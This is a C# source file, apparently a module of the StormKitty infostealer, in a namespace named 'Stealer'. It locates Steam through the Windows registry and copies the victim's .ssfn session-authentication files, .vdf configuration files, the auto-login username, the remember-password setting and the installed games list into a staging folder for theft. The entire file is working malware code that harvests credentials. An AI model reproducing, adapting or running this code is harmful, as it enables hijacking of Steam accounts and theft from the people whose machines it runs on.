using System;
using System.IO;
using Microsoft.Win32;

namespace Stealer
{
    internal sealed class Steam
    {
            
        public static bool GetSteamSession(string sSavePath)
        {
            RegistryKey rkSteam = Registry.CurrentUser.OpenSubKey("Software\\Valve\\Steam");
            if (rkSteam == null)
                return StormKitty.Logging.Log("Steam >> Application path not found in registry", false);

            string sSteamPath = rkSteam.GetValue("SteamPath").ToString();
            if (!Directory.Exists(sSteamPath))
                return StormKitty.Logging.Log("Steam >> Application directory not found", false);

            Directory.CreateDirectory(sSavePath);

            try
            {
                // Get steam applications list
                foreach (string GameID in rkSteam.OpenSubKey("Apps").GetSubKeyNames())
                {
                    using (RegistryKey app = rkSteam.OpenSubKey("Apps\\" + GameID))
                    {
                        string Name = (string)app.GetValue("Name");
                        Name = string.IsNullOrEmpty(Name) ? "Unknown" : Name;
                        string Installed = (int)app.GetValue("Installed") == 1 ? "Yes" : "No";
                        string Running = (int)app.GetValue("Running") == 1 ? "Yes" : "No";
                        string Updating = (int)app.GetValue("Updating") == 1 ? "Yes" : "No";

                        File.AppendAllText(sSavePath + "\\Apps.txt",
                            $"Application {Name}\n\tGameID: {GameID}\n\tInstalled: {Installed}\n\tRunning: {Running}\n\tUpdating: {Updating}\n\n");
                    }
                }
            }
            catch (Exception ex) { StormKitty.Logging.Log("Steam >> Failed collect steam apps\n" + ex); }

            try
            {
                // Copy .ssfn files
                if (Directory.Exists(sSteamPath))
                {
                    Directory.CreateDirectory(sSavePath + "\\ssnf");
                    foreach (string file in Directory.GetFiles(sSteamPath))
                        if (file.Contains("ssfn"))
                            File.Copy(file, sSavePath + "\\ssnf\\" + Path.GetFileName(file));
                }
            }
            catch (Exception ex) { StormKitty.Logging.Log("Steam >> Failed collect steam .ssnf files\n" + ex); }
            
            try
                {
                    // Copy .vdf files
                    string ConfigPath = Path.Combine(sSteamPath, "config");
                if (Directory.Exists(ConfigPath))
                {
                    Directory.CreateDirectory(sSavePath + "\\configs");
                    foreach (string file in Directory.GetFiles(ConfigPath))
                        if (file.EndsWith("vdf"))
                            File.Copy(file, sSavePath + "\\configs\\" + Path.GetFileName(file));
                }

            }
            catch (Exception ex) { StormKitty.Logging.Log("Steam >> Failed collect steam configs\n" + ex); }

            try
            {
                string RememberPassword = (int)rkSteam.GetValue("RememberPassword") == 1 ? "Yes" : "No";
                string sSteamInfo = String.Format(
                    "Autologin User: " + rkSteam.GetValue("AutoLoginUser") +
                    "\nRemember password: " + RememberPassword
                    );
                File.WriteAllText(sSavePath + "\\SteamInfo.txt", sSteamInfo);
                
                
            }
            catch (Exception ex) { StormKitty.Logging.Log("Steam >> Failed collect steam info\n" + ex); }

            Counter.Steam = true;
            return true;
        }
    }
}
